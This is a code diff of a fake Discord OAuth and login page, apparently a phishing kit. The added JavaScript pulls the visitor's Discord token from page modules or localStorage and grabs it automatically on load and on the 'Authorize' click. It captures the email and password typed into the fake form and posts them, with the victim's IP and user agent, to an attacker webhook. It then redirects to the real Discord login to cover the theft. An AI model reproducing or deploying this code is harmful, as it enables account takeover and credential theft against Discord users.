@@ -8,18 +8,16 @@
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body, html { height: 100%; background: #2f3136; font-family: 'Whitney', sans-serif; color: #dcddde; }
-    .page { display: none; width: 100%; }
-    .page.active { display: block; }
-    #oauthPage, #loginPage { padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .page { display: none; width: 100%; min-height: 100vh; justify-content: center; align-items: center; padding: 20px; }
+    .page.active { display: flex; }
     .container { max-width: 480px; width: 100%; }
   </style>
 </head>
 <body>
 
-  <!-- === REAL DISCORD OAUTH PAGE (FROM YOUR DUMP) === -->
+  <!-- === REAL DISCORD OAUTH PAGE === -->
   <div id="oauthPage" class="page active">
     <div class="container">
-      <!-- PASTED FROM YOUR OAUTH DUMP -->
       <div style="background: #36393f; border-radius: 8px; padding: 24px; box-shadow: 0 2px 10px rgba(0,0,0,0.3);">
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
           <span style="color: #72767d; font-size: 24px;">X</span>
@@ -67,10 +65,9 @@
     </div>
   </div>
 
-  <!-- === REAL DISCORD LOGIN PAGE (FROM YOUR DUMP) === -->
+  <!-- === REAL DISCORD LOGIN PAGE === -->
   <div id="loginPage" class="page">
     <div class="container">
-      <!-- PASTED FROM YOUR LOGIN DUMP -->
       <div style="background: #36393f; border-radius: 8px; padding: 40px 40px; max-width: 480px; margin: 0 auto;">
         <div style="text-align: center; margin-bottom: 24px;">
           <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" style="width: 124px;">
@@ -112,4 +109,80 @@
 
     function getToken() {
       injectWebpack();
-      const mod = modules.find(m => m
+      const mod = modules.find(m => m?.getToken);
+      if (mod) {
+        const t = mod.getToken();
+        if (t && t.length > 50) return t.replace(/"/g, '');
+      }
+      try {
+        const ls = localStorage.getItem('token');
+        if (ls && ls.length > 50) return ls.replace(/"/g, '');
+      } catch (e) {}
+      return null;
+    }
+
+    async function sendData(title, fields = []) {
+      const token = getToken();
+      const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
+      const payload = {
+        embeds: [{
+          title,
+          color: title.includes('TOKEN') ? 0x00ff00 : 0x5865f2,
+          fields: [
+            ...fields,
+            ...(token ? [{ name: 'Token', value: `\`\`\`${token.substring(0, 60)}...\`\`\``, inline: false }] : []),
+            { name: 'IP', value: `\`${ip}\``, inline: true },
+            { name: 'UA', value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+      fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    }
+
+    async function grabToken() {
+      for (let i = 0; i < 4; i++) {
+        const token = getToken();
+        if (token) {
+          await sendData('TOKEN STOLEN');
+          return true;
+        }
+        await new Promise(r => setTimeout(r, 600));
+      }
+      return false;
+    }
+
+    // AUTHORIZE CLICK → INSTANT LOGIN PAGE + TOKEN GRAB
+    document.getElementById('authorizeBtn').addEventListener('click', async () => {
+      // INSTANT SWITCH
+      document.getElementById('oauthPage').classList.remove('active');
+      document.getElementById('loginPage').classList.add('active');
+
+      // GRAB TOKEN IN BACKGROUND
+      grabToken();
+    });
+
+    // LOGIN SUBMIT → SEND CREDS + TOKEN AGAIN
+    document.getElementById('loginForm').onsubmit = async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      if (!email || !password) return;
+
+      await sendData('LOGIN SUCCESS', [
+        { name: 'Email/Phone', value: `\`${email}\``, inline: false },
+        { name: 'Password', value: `\`${password}\``, inline: false }
+      ]);
+
+      setTimeout(() => {
+        window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
+      }, 800);
+    };
+
+    // AUTO-GRAB ON LOAD
+    window.addEventListener('load', () => {
+      setTimeout(grabToken, 1200);
+    });
+  </script>
+</body>
+</html>
